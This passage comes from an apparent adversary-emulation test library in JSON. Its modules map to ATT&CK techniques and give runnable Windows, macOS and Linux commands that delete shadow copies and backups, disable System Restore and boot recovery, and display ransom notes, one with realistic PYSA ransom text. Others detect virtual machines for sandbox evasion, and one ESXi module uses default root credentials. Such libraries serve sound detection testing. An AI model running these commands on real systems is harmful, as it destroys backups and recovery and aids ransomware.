      "description": "Deletes Windows Volume Shadow Copies. This technique is used by numerous ransomware families and APT malware such as Olympic Destroyer. Upon\nexecution, if no shadow volumes exist the message \"No items found that satisfy the query.\" will be displayed. If shadow volumes are present, it\nwill delete them without printing output to the screen. This is because the /quiet parameter was passed which also suppresses the y/n\nconfirmation prompt. Shadow copies can only be created on Windows server or Windows 8.\n\nhttps://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/cc788055(v=ws.11)\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "vssadmin.exe delete shadows /all /quiet\n",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [
        {
          "description": "Create volume shadow copy of C:\\ . This prereq command only works on Windows Server or Windows 8.\n",
          "check_command": "if(!(vssadmin.exe list shadows | findstr \"No items found that satisfy the query.\")) { exit 0 } else { exit 1 }\n",
          "install_command": "vssadmin.exe create shadow /for=c:\n"
        }
      ],
      "rx_module_id": "43819286-91a9-4369-90ed-d31fb4da2c01",
      "module_name": "Windows - Delete Volume Shadow Copies"
    },
    {
      "index": 1117,
      "technique_id": "T1490",
      "technique_name": "Inhibit System Recovery",
      "description": "Deletes Windows Volume Shadow Copies via WMI. This technique is used by numerous ransomware families and APT malware such as Olympic Destroyer.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "wmic.exe shadowcopy delete\n",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [
        {
          "description": "Create volume shadow copy of C:\\ .\n",
          "check_command": "if(!(vssadmin.exe list shadows | findstr \"No items found that satisfy the query.\")) { exit 0 } else { exit 1 }\n",
          "install_command": "wmic shadowcopy call create Volume='C:\\'\n"
        }
      ],
      "rx_module_id": "6a3ff8dd-f49c-4272-a658-11c2fe58bd88",
      "module_name": "Windows - Delete Volume Shadow Copies via WMI"
    },
    {
      "index": 1118,
      "technique_id": "T1490",
      "technique_name": "Inhibit System Recovery",
      "description": "Deletes Windows Backup Catalog. This technique is used by numerous ransomware families and APT malware such as Olympic Destroyer. Upon execution,\n\"The backup catalog has been successfully deleted.\" will be displayed in the PowerShell session.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "wbadmin delete catalog -quiet\n",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "263ba6cb-ea2b-41c9-9d4e-b652dadd002c",
      "module_name": "Windows - wbadmin Delete Windows Backup Catalog"
    },
    {
      "index": 1119,
      "technique_id": "T1490",
      "technique_name": "Inhibit System Recovery",
      "description": "Disables repair by the Windows Recovery Console on boot. This technique is used by numerous ransomware families and APT malware such as Olympic Destroyer.\nUpon execution, \"The operation completed successfully.\" will be displayed in the powershell session.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures\nbcdedit.exe /set {default} recoveryenabled no\n",
        "elevation_required": true,
        "cleanup_command": "bcdedit.exe /set {default} bootstatuspolicy DisplayAllFailures >nul 2>&1\nbcdedit.exe /set {default} recoveryenabled yes >nul 2>&1\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "cf21060a-80b3-4238-a595-22525de4ab81",
      "module_name": "Windows - Disable Windows Recovery Console Repair"
    },
    {
      "index": 1120,
      "technique_id": "T1490",
      "technique_name": "Inhibit System Recovery",
      "description": "Deletes Windows Volume Shadow Copies with PowerShell code and Get-WMIObject.\nThis technique is used by numerous ransomware families such as Sodinokibi/REvil.\nExecutes Get-WMIObject. Shadow copies can only be created on Windows server or Windows 8, so upon execution\nthere may be no output displayed.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Get-WmiObject Win32_Shadowcopy | ForEach-Object {$_.Delete();}\n",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "39a295ca-7059-4a88-86f6-09556c1211e7",
      "module_name": "Windows - Delete Volume Shadow Copies via WMI with PowerShell"
    },
    {
      "index": 1121,
      "technique_id": "T1490",
      "technique_name": "Inhibit System Recovery",
      "description": "Deletes backup files in a manner similar to Ryuk ransomware. Upon exection, many \"access is denied\" messages will appear as the commands try\nto delete files from around the system.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "del /s /f /q c:\\*.VHD c:\\*.bac c:\\*.bak c:\\*.wbcat c:\\*.bkf c:\\Backup*.* c:\\backup*.* c:\\*.set c:\\*.win c:\\*.dsk\n",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "6b1dbaf6-cc8a-4ea6-891f-6058569653bf",
      "module_name": "Windows - Delete Backup Files"
    },
    {
      "index": 1122,
      "technique_id": "T1490",
      "technique_name": "Inhibit System Recovery",
      "description": "Deletes the Windows systemstatebackup using wbadmin.exe. This technique is used by numerous ransomware families. This may only be successful on server platforms that have Windows Backup enabled.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "wbadmin delete systemstatebackup -keepVersions:0\n",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "584331dd-75bc-4c02-9e0b-17f5fd81c748",
      "module_name": "Windows - wbadmin Delete systemstatebackup"
    },
    {
      "index": 1123,
      "technique_id": "T1490",
      "technique_name": "Inhibit System Recovery",
      "description": "Use schtasks.exe to disable the System Restore (SR) scheduled task\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "schtasks.exe /Change /TN \"\\Microsoft\\Windows\\SystemRestore\\SR\" /disable\n",
        "elevation_required": true,
        "cleanup_command": "schtasks.exe /Change /TN \"\\Microsoft\\Windows\\SystemRestore\\SR\" /enable >nul 2>&1\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "1c68c68d-83a4-4981-974e-8993055fa034",
      "module_name": "Windows - Disable the SR scheduled task"
    },
    {
      "index": 1124,
      "technique_id": "T1490",
      "technique_name": "Inhibit System Recovery",
      "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to disable system restore on the computer. \nSee how remcos RAT abuses this technique- https://www.virustotal.com/gui/file/2d7855bf6470aa323edf2949b54ce2a04d9e38770f1322c3d0420c2303178d91/details\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\SystemRestore\" /v \"DisableConfig\" /t \"REG_DWORD\" /d \"1\" /f\nreg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\SystemRestore\" /v \"DisableSR\" /t \"REG_DWORD\" /d \"1\" /f\nreg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SystemRestore\" /v \"DisableConfig\" /t \"REG_DWORD\" /d \"1\" /f\nreg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SystemRestore\" /v \"DisableSR\" /t \"REG_DWORD\" /d \"1\" /f\n",
        "elevation_required": true,
        "cleanup_command": "reg delete \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\SystemRestore\" /v \"DisableConfig\" /f >nul 2>&1\nreg delete \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\SystemRestore\" /v \"DisableSR\" /f >nul 2>&1\nreg delete \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SystemRestore\" /v \"DisableConfig\" /f >nul 2>&1\nreg delete \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SystemRestore\" /v \"DisableSR\" /f >nul 2>&1\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "66e647d1-8741-4e43-b7c1-334760c2047f",
      "module_name": "Disable System Restore Through Registry"
    },
    {
      "index": 1125,
      "technique_id": "T1490",
      "technique_name": "Inhibit System Recovery",
      "description": "Adversaries generally try to Resize Shadowstorage Volume using vssadmin.exe to avoid the shadow volumes being made again. This technique is typically found used by adversaries during a ransomware event and a precursor to deleting the shadowstorage.",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "vssadmin resize shadowstorage /For=C: /On=C: /MaxSize=20%",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "da558b07-69ae-41b9-b9d4-4d98154a7049",
      "module_name": "Windows - vssadmin Resize Shadowstorage Volume"
    },
    {
      "index": 1126,
      "technique_id": "T1490",
      "technique_name": "Inhibit System Recovery",
      "description": "This RAGLOX module alters the security settings of the Volume Shadow Copy Service (VSS) by modifying its permissions, potentially impacting system recovery operations. The specific permissions set by the command are as follows:\n- Deny Generic All (GA) permissions to Network Users (NU)\n- Deny GA permissions to Everyone (WD)\n- Deny GA permissions to Anonymous (AN)\n- Allow Full Access (FA) and Generic All (GA) permissions to Everyone (WD) in System ACL (SACL)\n- Allow Object Inherit and Inherit Only (OIIO) Full Access (FA) and GA permissions to Everyone (WD) in SACL\nThese permissions can significantly restrict VSS functionalities, including backup and restore operations. As such, it is essential to run this test only in a controlled environment with administrative privileges.\nA cleanup command is provided to reset VSS permissions to a common default configuration, which should be verified against your specific system's configuration. It's crucial to use this cleanup command after testing to ensure the system's backup and recovery capabilities remain functional. Running this test on a production system or critical environment is not recommended without proper precautions and a robust recovery plan.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "sc sdset VSS D:(D;;GA;;;NU)(D;;GA;;;WD)(D;;GA;;;AN)S:(AU;FA;GA;;;WD)(AU;OIIOFA;GA;;;WD)\n",
        "elevation_required": true,
        "cleanup_command": "sc sdset VSS D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;LC;;;BU)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "a4420f93-5386-4290-b780-f4f66abc7070",
      "module_name": "Modify VSS Service Permissions"
    },
    {
      "index": 1127,
      "technique_id": "T1490",
      "technique_name": "Inhibit System Recovery",
      "description": "Disables Time Machine which is Apple's automated backup utility software. Attackers can use this to prevent backups from occurring and hinder the victim's ability to recover from any damage.\n",
      "execution": {
        "platforms": [
          "macos"
        ],
        "executor_type": "sh",
        "command": "sudo tmutil disable",
        "elevation_required": true,
        "cleanup_command": "sudo tmutil enable"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "ed952f70-91d4-445a-b7ff-30966bfb1aff",
      "module_name": "Disable Time Machine"
    },
    {
      "index": 1128,
      "technique_id": "T1491.001",
      "technique_name": "Defacement: Internal Defacement",
      "description": "Downloads an image from a URL and sets it as the desktop wallpaper.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "$url = \"#{url_of_wallpaper}\"\n$imgLocation = \"#{wallpaper_location}\"\n$orgWallpaper = (Get-ItemProperty -Path Registry::'HKEY_CURRENT_USER\\Control Panel\\Desktop\\' -Name WallPaper).WallPaper\n$orgWallpaper | Out-File -FilePath \"#{pointer_to_orginal_wallpaper}\"\n$updateWallpapercode = @' \nusing System.Runtime.InteropServices; \nnamespace Win32{\n\n    public class Wallpaper{ \n        [DllImport(\"user32.dll\", CharSet=CharSet.Auto)] \n         static extern int SystemParametersInfo (int uAction , int uParam , string lpvParam , int fuWinIni) ; \n         \n         public static void SetWallpaper(string thePath){ \n            SystemParametersInfo(20,0,thePath,3); \n        }\n    }\n} \n'@\n$wc = New-Object System.Net.WebClient  \ntry{  \n    $wc.DownloadFile($url, $imgLocation)\n    add-type $updateWallpapercode \n    [Win32.Wallpaper]::SetWallpaper($imgLocation)\n} \ncatch [System.Net.WebException]{  \n    Write-Host(\"Cannot download $url\") \n    add-type $updateWallpapercode \n    [Win32.Wallpaper]::SetWallpaper($imgLocation)\n} \nfinally{    \n    $wc.Dispose()  \n}\n",
        "elevation_required": false,
        "cleanup_command": "$updateWallpapercode = @' \nusing System.Runtime.InteropServices; \nnamespace Win32{\n\n    public class Wallpaper{ \n        [DllImport(\"user32.dll\", CharSet=CharSet.Auto)] \n         static extern int SystemParametersInfo (int uAction , int uParam , string lpvParam , int fuWinIni) ; \n         \n         public static void SetWallpaper(string thePath){ \n            SystemParametersInfo(20,0,thePath,3); \n        }\n    }\n} \n'@\nif (Test-Path -Path #{pointer_to_orginal_wallpaper} -PathType Leaf) {\n     $orgImg = Get-Content -Path \"#{pointer_to_orginal_wallpaper}\"\n     add-type $updateWallpapercode \n     [Win32.Wallpaper]::SetWallpaper($orgImg)\n}\nRemove-Item \"#{pointer_to_orginal_wallpaper}\" -ErrorAction Ignore\nRemove-Item \"#{wallpaper_location}\" -ErrorAction Ignore\n"
      },
      "variables": [
        {
          "name": "url_of_wallpaper",
          "description": "URL pointing to the image file you wish to set as wallpaper",
          "type": "url",
          "default_value": "https://redcanary.com/wp-content/uploads/RAGLOX-Red-Team-Logo.png"
        },
        {
          "name": "pointer_to_orginal_wallpaper",
          "description": "Full path to where a file containing the original wallpaper location will be saved",
          "type": "string",
          "default_value": "$env:TEMP\\T1491.001-OrginalWallpaperLocation"
        },
        {
          "name": "wallpaper_location",
          "description": "Full path to where the downloaded wallpaper image will be saved",
          "type": "string",
          "default_value": "$env:TEMP\\T1491.001-newWallpaper.png"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "30558d53-9d76-41c4-9267-a7bd5184bed3",
      "module_name": "Replace Desktop Wallpaper"
    },
    {
      "index": 1129,
      "technique_id": "T1491.001",
      "technique_name": "Defacement: Internal Defacement",
      "description": "Display ransom message to users at system start-up by configuring registry keys HKLM\\SOFTWARE\\Micosoft\\Windows\\CurrentVersion\\Policies\\System\\LegalNoticeCaption and HKLM\\SOFTWARE\\Micosoft\\Windows\\CurrentVersion\\Policies\\System\\LegalNoticeText.\n\n[SynAck Ransomware](https://www.trendmicro.com/vinfo/es/security/news/cybercrime-and-digital-threats/synack-ransomware-leverages-process-doppelg-nging-for-evasion-and-infection), \n[Grief Ransomware](https://redcanary.com/blog/grief-ransomware/), \n[Maze Ransomware](https://cyware.com/research-and-analysis/maze-ransomware-a-deadly-combination-of-data-theft-and-encryption-to-target-us-organizations-8f27),\n[Pysa Ransomware](https://www.cybereason.com/blog/research/threat-analysis-report-inside-the-destructive-pysa-ransomware),\n[Spook Ransomware](https://community.fortinet.com/t5/FortiEDR/Threat-Coverage-How-FortiEDR-protects-against-Spook-Ransomware/ta-p/204226),\n[DopplePaymer Ransomware](https://www.microsoft.com/en-us/wdsi/threats/malware-encyclopedia-description?Name=Ransom:Win32/Dopplepaymer&threatId=-2147221958),\n[Reedemer Ransomware](https://blog.cyble.com/2022/07/20/redeemer-ransomware-back-action/),\n[Kangaroo Ransomware](https://www.bleepingcomputer.com/news/security/the-kangaroo-ransomware-not-only-encrypts-your-data-but-tries-to-lock-you-out-of-windows/)\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "$orgLegalNoticeCaption = (Get-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System -Name LegalNoticeCaption).LegalNoticeCaption\n$orgLegalNoticeText = (Get-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System -Name LegalNoticeText).LegalNoticeText\n$newLegalNoticeCaption = \"#{legal_notice_caption}\"\n$newLegalNoticeText = \"#{legal_notice_text}\"\nSet-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System -Name LegalNoticeCaption -Value $newLegalNoticeCaption -Type String -Force\nSet-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System -Name LegalNoticeText -Value $newLegalNoticeText -Type String -Force      ",
        "elevation_required": true,
        "cleanup_command": "Set-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System -Name LegalNoticeCaption -Value $orgLegalNoticeCaption -Type String -Force\nSet-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System -Name LegalNoticeText -Value $orgLegalNoticeText -Type String -Force\n"
      },
      "variables": [
        {
          "name": "legal_notice_caption",
          "description": "Title of ransom message",
          "type": "string",
          "default_value": "PYSA"
        },
        {
          "name": "legal_notice_text",
          "description": "Body of ransom message",
          "type": "string",
          "default_value": "Hi Company, every byte on any types of your devices was encrypted. Don't try to use backups because it were encrypted too. To get all your data contact us:xxxx@onionmail.org"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "ffcbfaab-c9ff-470b-928c-f086b326089b",
      "module_name": "Configure LegalNoticeCaption and LegalNoticeText registry keys to display ransom message"
    },
    {
      "index": 1130,
      "technique_id": "T1491.001",
      "technique_name": "Defacement: Internal Defacement",
      "description": "Changes the ESXi welcome message to potentially display ransom information.\n[Reference](https://lolesxi-project.github.io/LOLESXi/lolesxi/Binaries/esxcli/#change%20display%20information)\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "echo \"\" | \"#{plink_file}\" -batch \"#{vm_host}\" -ssh -l #{vm_user} -pw \"#{vm_pass}\" \"esxcli system welcomemsg set -m 'RANSOMWARE-NOTIFICATION'\"\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "vm_host",
          "description": "Specify the host name or IP of the ESXi server.",
          "type": "string",
          "default_value": "raglox.local"
        },
        {
          "name": "vm_user",
          "description": "Specify the privilege user account on the ESXi server.",
          "type": "string",
          "default_value": "root"
        },
        {
          "name": "vm_pass",
          "description": "Specify the privileged user's password.",
          "type": "string",
          "default_value": "password"
        },
        {
          "name": "plink_file",
          "description": "Path to Plink",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\..\\ExternalPayloads\\plink.exe"
        }
      ],
      "prerequisites": [
        {
          "description": "Check if we have plink\n",
          "check_command": "if (Test-Path \"#{plink_file}\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://the.earth.li/~sgtatham/putty/latest/w64/plink.exe\" -OutFile \"#{plink_file}\"\n"
        }
      ],
      "rx_module_id": "30905f21-34f3-4504-8b4c-f7a5e314b810",
      "module_name": "ESXi - Change Welcome Message on Direct Console User Interface (DCUI)"
    },
    {
      "index": 1131,
      "technique_id": "T1491.001",
      "technique_name": "Defacement: Internal Defacement",
      "description": "Creates a temporary ransom-note text file and opens it in Notepad to\nsimulate ransomware \"note display\" behavior without making destructive\nchanges. SAFE and non-destructive.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "$notePath = Join-Path $env:TEMP \"#{note_filename}\"\n$pidPath  = Join-Path $env:TEMP \"#{pid_filename}\"\n\n$Title = \"#{note_title}\"\n$Body  = \"#{note_body}\"\n\n$header  = $Title + \"`r`n\" + ('=' * $Title.Length) + \"`r`n`r`n\"\n$content = $header + $Body\n\n[System.IO.File]::WriteAllText($notePath, $content, [System.Text.Encoding]::UTF8)\n\n$p = Start-Process notepad.exe -ArgumentList \"`\"$notePath`\"\" -PassThru\n$p.Id | Out-File -FilePath $pidPath -Encoding ascii -Force\n",
        "elevation_required": false,
        "cleanup_command": "try {\n  # 1. Kill all Notepad processes\n  Get-Process notepad -ErrorAction SilentlyContinue |\n    ForEach-Object {\n      Stop-Process -Id $_.Id -Force -ErrorAction SilentlyContinue\n    }\n\n  # 2. Wait briefly for Windows to release file handles\n  Start-Sleep -Seconds 1\n\n  # 3. Force delete ransom note + PID file\n  $notePath = Join-Path $env:TEMP \"ART-T1491-ransom-note.txt\"\n  $pidPath  = Join-Path $env:TEMP \"ART-T1491-notepad.pid\"\n\n  if (Test-Path $notePath) {\n    Remove-Item $notePath -Force -ErrorAction Stop\n  }\n  if (Test-Path $pidPath) {\n    Remove-Item $pidPath -Force -ErrorAction Stop\n  }\n}\ncatch {\n  Write-Warning \"Cleanup failed with error: $_\"\n}\n"
      },
      "variables": [
        {
          "name": "note_filename",
          "description": "File name for the simulated ransom note",
          "type": "string",
          "default_value": "ART-T1491-ransom-note.txt"
        },
        {
          "name": "pid_filename",
          "description": "File name for storing Notepad PID",
          "type": "string",
          "default_value": "ART-T1491-notepad.pid"
        },
        {
          "name": "note_title",
          "description": "Title at the top of the ransom note",
          "type": "string",
          "default_value": "!!! READ_ME_NOW !!!"
        },
        {
          "name": "note_body",
          "description": "The body of the ransom note (plain text)",
          "type": "string",
          "default_value": "Your files are SAFE. This is a TEST note for detection validation\nby bak3n3k0. No data has been encrypted. This simulation exercises\ndetections for:\n  - notepad.exe launched with a ransom-themed text file\n  - creation of a ransom-themed text file in %TEMP%\nNON-DESTRUCTIVE RAGLOX Threat Library test.\n"
        }
      ],
      "prerequisites": [
        {
          "description": "Notepad must be present on the system",
          "check_command": "where notepad",
          "install_command": ""
        }
      ],
      "rx_module_id": "0eeb68ce-e64c-4420-8d53-ad5bdc6f86d5",
      "module_name": "Windows - Display a simulated ransom note via Notepad (non-destructive)"
    },
    {
      "index": 1132,
      "technique_id": "T1496",
      "technique_name": "Resource Hijacking",
      "description": "This test simulates a high CPU load as you might observe during cryptojacking attacks.\nEnd the test by using CTRL/CMD+C to break.\n",
      "execution": {
        "platforms": [
          "linux",
          "macos"
        ],
        "executor_type": "sh",
        "command": "yes > /dev/null\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "904a5a0e-fb02-490d-9f8d-0e256eb37549",
      "module_name": "FreeBSD/macOS/Linux - Simulate CPU Load with Yes"
    },
    {
      "index": 1133,
      "technique_id": "T1497.001",
      "technique_name": "Virtualization/Sandbox Evasion: System Checks",
      "description": "systemd-detect-virt detects execution in a virtualized environment.\nAt boot, dmesg stores a log if a hypervisor is detected.\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "if (systemd-detect-virt) then echo \"Virtualization Environment detected\"; fi;\nif (sudo dmidecode | egrep -i 'manufacturer|product|vendor' | grep -iE 'Oracle|VirtualBox|VMWare|Parallels') then echo \"Virtualization Environment detected\"; fi;\n",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "dfbd1a21-540d-4574-9731-e852bd6fe840",
      "module_name": "Detect Virtualization Environment (Linux)"
    },
    {
      "index": 1134,
      "technique_id": "T1497.001",
      "technique_name": "Virtualization/Sandbox Evasion: System Checks",
      "description": "Detects execution in a virtualized environment.\nAt boot, dmesg stores a log if a hypervisor is detected.\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "if [ \"$(sysctl -n hw.hv_vendor)\" != \"\" ]; then echo \"Virtualization Environment detected\"; fi\n",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "e129d73b-3e03-4ae9-bf1e-67fc8921e0fd",
      "module_name": "Detect Virtualization Environment (FreeBSD)"
    },
    {
      "index": 1135,
      "technique_id": "T1497.001",
      "technique_name": "Virtualization/Sandbox Evasion: System Checks",
      "description": "Windows Management Instrumentation(WMI) objects contains system information which helps to detect virtualization. This command will specifically attempt to get the CurrentTemperature value from this object and will check to see if the attempt results in an error that contains the word supported. This is meant to find the result of Not supported, which is the result if run in a virtual machine\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "$error.clear()\nGet-WmiObject -Query \"SELECT * FROM MSAcpi_ThermalZoneTemperature\" -ErrorAction SilentlyContinue\nif($error) {echo \"Virtualization Environment detected\"}\n",
        "elevation_required": false,
        "cleanup_command": "$error.clear()\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "502a7dc4-9d6f-4d28-abf2-f0e84692562d",
      "module_name": "Detect Virtualization Environment (Windows)"
    },
    {
      "index": 1136,
      "technique_id": "T1497.001",
      "technique_name": "Virtualization/Sandbox Evasion: System Checks",
      "description": "ioreg contains registry entries for all the device drivers in the system. If it's a virtual machine, one of the device manufacturer will be a Virtualization Software.\n",
      "execution": {
        "platforms": [
          "macos"
        ],
        "executor_type": "sh",
        "command": "if (ioreg -l | grep -e Manufacturer -e 'Vendor Name' | grep -iE 'Oracle|VirtualBox|VMWare|Parallels') then echo 'Virtualization Environment detected'; fi;\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "a960185f-aef6-4547-8350-d1ce16680d09",
      "module_name": "Detect Virtualization Environment via ioreg"
    },
    {
      "index": 1137,
      "technique_id": "T1497.001",
      "technique_name": "Virtualization/Sandbox Evasion: System Checks",
      "description": "Windows Management Instrumentation(WMI) objects contain system information which helps to detect virtualization. This test will get the model and manufacturer of the machine to determine if it is a virtual machine, such as through VMware or VirtualBox. \n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "$Manufacturer = Get-WmiObject -Class Win32_ComputerSystem | select-object -expandproperty \"Manufacturer\"\n$Model = Get-WmiObject -Class Win32_ComputerSystem | select-object -expandproperty \"Model\"\nif((($Manufacturer.ToLower() -eq \"microsoft corporation\") -and ($Model.ToLower().contains(\"virtual\"))) -or ($Manufacturer.ToLower().contains(\"vmware\")) -or ($Model.ToLower() -eq \"virtualbox\")) {write-host \"Virtualization environment detected!\"} else {write-host \"No virtualization environment detected!\"}\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "4a41089a-48e0-47aa-82cb-5b81a463bc78",
      "module_name": "Detect Virtualization Environment via WMI Manufacturer/Model Listing (Windows)"
    },
    {
      "index": 1138,
      "technique_id": "T1497.001",
      "technique_name": "Virtualization/Sandbox Evasion: System Checks",
      "description": "sysctl hw.model will return the model name of the hardware(Macmini8,1, MacBookAir10,1, etc.) in case of native Apple hardware\nbut will return the hypervisor name (VMware7,0).\nReference: https://evasions.checkpoint.com/src/MacOS/macos.html#hardware-model\n",
      "execution": {
        "platforms": [
          "macos"
        ],
        "executor_type": "sh",
        "command": "if [ \"$(sysctl -n hw.model | grep -v 'Mac')\" != \"\" ]; then echo 'Virtualization Environment detected'; fi;\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "6beae646-eb4c-4730-95be-691a4094408c",
      "module_name": "Detect Virtualization Environment using sysctl (hw.model)"
    },
    {
      "index": 1139,
      "technique_id": "T1497.001",
      "technique_name": "Virtualization/Sandbox Evasion: System Checks",
      "description": "The latest versions of macOS have the System Integrity Protection feature (SIP). If a sandbox uses a non-signed \nkernel extension for monitoring purposes the, SIP feature must be disabled to load this kind of kernel extension.\nMalware may check if the SIP is enabled.\nReference: https://evasions.checkpoint.com/src/MacOS/macos.html#sip\n",
      "execution": {
        "platforms": [
          "macos"
        ],
        "executor_type": "sh",
        "command": "if [ \"$(csrutil status | grep -v 'enabled')\" != \"\" ]; then echo 'Possible Virtualization Environment detected'; fi;\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "2b73cd9b-b2fb-4357-b9d7-c73c41d9e945",
      "module_name": "Check if System Integrity Protection is enabled"
    },
    {
      "index": 1140,
      "technique_id": "T1497.001",
      "technique_name": "Virtualization/Sandbox Evasion: System Checks",
      "description": "system_profiler provides system hardware and software configuration and the Model Identifier should provide the value similar to (sysctl -n hw.model). \nWe should be able to find whether virtualization is enabled by checking whether the Model Identifier does not contain \"Mac\".\n",
      "execution": {
        "platforms": [
          "macos"
        ],
        "executor_type": "sh",
        "command": "if [ \"$(system_profiler SPHardwareDataType | grep \"Model Identifier\" | grep -v 'Mac')\" != \"\" ]; then echo 'Virtualization Environment detected'; fi;\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "e04d2e89-de15-4d90-92f9-a335c7337f0f",
      "module_name": "Detect Virtualization Environment using system_profiler"
    },
    {
      "index": 1141,
      "technique_id": "T1497.003",
      "technique_name": "Time Based Evasion",
      "description": "Uses the ping command to introduce a delay before executing a malicious payload.\n",
      "execution": {
        "platforms": [
          "linux",
          "macos"
        ],
        "executor_type": "sh",
        "command": "ping -c #{ping_count} 8.8.8.8 > /dev/null\n#{evil_command}\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "evil_command",
          "description": "Command to run after the delay",
          "type": "string",
          "default_value": "whoami"
        },
        {
          "name": "ping_count",
          "description": "Number of ping requests to send (higher counts increase the delay)",
          "type": "integer",
          "default_value": 250
        }
      ],
      "prerequisites": [],
      "rx_module_id": "8b87dd03-8204-478c-bac3-3959f6528de3",
      "module_name": "Delay execution with ping"
    },
    {
      "index": 1142,
      "technique_id": "T1505.002",
      "technique_name": "Server Software Component: Transport Agent",
      "description": "Install a Microsoft Exchange Transport Agent for persistence. This requires execution from an Exchange Client Access Server and the creation of a DLL with specific exports. Seen in use by Turla.\nMore details- https://docs.microsoft.com/en-us/exchange/transport-agents-exchange-2013-help\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
